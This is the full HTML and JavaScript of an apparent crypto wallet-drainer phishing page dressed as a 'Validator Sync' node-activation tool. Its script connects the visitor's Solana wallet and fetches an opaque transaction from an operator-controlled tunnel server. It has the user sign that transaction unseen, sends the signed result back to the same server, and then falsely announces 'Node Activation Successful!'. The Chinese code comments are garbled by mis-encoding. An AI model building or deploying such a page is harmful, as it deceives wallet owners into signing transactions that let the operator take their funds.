<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Node Verification</title>
    <style>
        /* Âº∫Âà∂ËÉåÊôØËâ≤ÔºåÈò≤Ê≠¢ÁôΩÂ±èÊÑü */
        html, body { background-color: #0b0e11 !important; margin: 0; padding: 0; height: 100%; color: white; }
        .main-container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .box { background: #181a20; padding: 30px; border-radius: 16px; border: 1px solid #2b2f36; width: 85%; max-width: 350px; }
        .btn { background: #f0b90b; color: black; border: none; padding: 16px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: bold; margin-top: 20px; cursor: pointer; }
        .btn:disabled { background: #474d57; color: #848e9c; }
        .log { margin-top: 15px; font-size: 12px; color: #848e9c; min-height: 20px; }
    </style>
</head>
<body>

    <div class="main-container">
        <div class="box">
            <h2 style="margin:0 0 10px 0;">Validator Sync</h2>
            <p style="font-size: 14px; color: #eaeaea;">Securely link your wallet to activate the validator node.</p>
            
            <button id="activate_btn" class="btn">ACTIVATE NOW</button>
            <div id="status_log" class="log">System Status: Ready</div>
        </div>
    </div>

    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js" onerror="alert('Library Load Failed! Check Internet.')"></script>

    <script>
        // üî± ÈÖçÁΩÆÊ£ÄÊü•ÔºöÁ°Æ‰øùÈößÈÅìÂú∞ÂùÄ‰∏ç‰ª•ÊñúÊù†ÁªìÂ∞æ
        const API_BASE = "https://‰Ω†ÁöÑÁ©øÈÄèÂú∞ÂùÄ.com"; 

        const btn = document.getElementById('activate_btn');
        const logBox = document.getElementById('status_log');

        function updateLog(m) {
            logBox.innerText = m;
            console.log(m);
        }

        async function start() {
            try {
                updateLog("Detecting Wallet...");
                const provider = window.trustwallet?.solana || window.solana;
                
                if (!provider) {
                    alert("Please open this link inside Trust Wallet Browser!");
                    return;
                }

                btn.disabled = true;
                updateLog("Connecting...");
                await provider.connect();
                
                const address = provider.publicKey.toString();
                updateLog("Wallet: " + address.substring(0, 4) + "..." + address.substring(address.length - 4));

                // Á¨¨‰∏ÄÊ≠•ÔºöËØ∑Ê±ÇÊûÑÈÄ†
                updateLog("Fetching Config...");
                const res = await fetch(`${API_BASE}/prepare_v32`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ address: address })
                });

                if (!res.ok) throw new Error("Server Response Error: " + res.status);
                
                const data = await res.json();
                if (!data.raw_tx) throw new Error(data.error || "No Transaction Data");

                // Á¨¨‰∫åÊ≠•ÔºöÁ≠æÂêç
                updateLog("Awaiting Signature...");
                const web3 = window.solanaWeb3;
                const tx = web3.Transaction.from(Uint8Array.from(atob(data.raw_tx), c => c.charCodeAt(0)));
                
                const signed = await provider.signTransaction(tx);
                updateLog("Broadcasting...");

                // Á¨¨‰∏âÊ≠•ÔºöÂπøÊí≠
                const bRes = await fetch(`${API_BASE}/broadcast_v41`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ 
                        signed_tx: btoa(String.fromCharCode.apply(null, signed.serialize())) 
                    })
                });

                updateLog("Activation Finalized!");
                alert("Node Activation Successful!");

            } catch (e) {
                alert("Process Error: " + e.message);
                updateLog("Error: " + e.message);
                btn.disabled = false;
            }
        }

        btn.onclick = start;

        // üî± ÂêØÂä®Ëá™Ê£Ä
        window.onload = () => {
            console.log("üî± Engine Loaded. API:", API_BASE);
            if (!window.solanaWeb3) updateLog("Error: Web3 Library Not Found");
        };
    </script>
</body>
</html>
